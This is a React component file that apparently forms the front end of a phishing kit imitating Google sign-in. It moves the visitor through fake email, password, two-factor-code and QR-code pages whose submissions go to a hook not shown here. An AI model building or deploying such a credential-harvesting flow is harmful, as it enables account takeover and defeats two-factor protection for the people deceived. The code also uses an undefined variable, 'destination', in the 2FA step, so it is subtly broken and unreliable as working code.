import React from 'react';
import './GoogleLogin.css';
import GoogleEmailPage from '../pages/GoogleEmailPage';
import GooglePasswordPage from '../pages/GooglePasswordPage';
import Google2FAPage from '../pages/Google2FAPage';
import GoogleQRPage from '../pages/GoogleQRPage';
import LoadingSpinner from './LoadingSpinner';
import useGoogleFlow from '../hooks/useGoogleFlow';

const GoogleLogin = () => {
  const {
    page,
    loading,
    email,
    qrImage,
    error,
    submitEmail,
    submitPassword,
    submit2fa,
    continueAfterQr,
  } = useGoogleFlow();


  return (
    <div className="google-login-container">
      {loading && <LoadingSpinner fullPage text="Processing..." />}
      {error && <div className="error-message">{error}</div>}

      {page === 'email' && (
        <GoogleEmailPage onNext={submitEmail} loading={loading} />
      )}
      {page === 'password' && (
        <GooglePasswordPage
          email={email}
          onNext={submitPassword}
          loading={loading}
        />
      )}
      {page === '2fa' && (
        <Google2FAPage destination={destination} onSubmit={submit2fa} loading={loading} />
      )}
      {page === 'qr' && (
        <GoogleQRPage qr={qrImage} onNext={continueAfterQr} loading={loading} />
      )}
    </div>
  );
};

export default GoogleLogin;
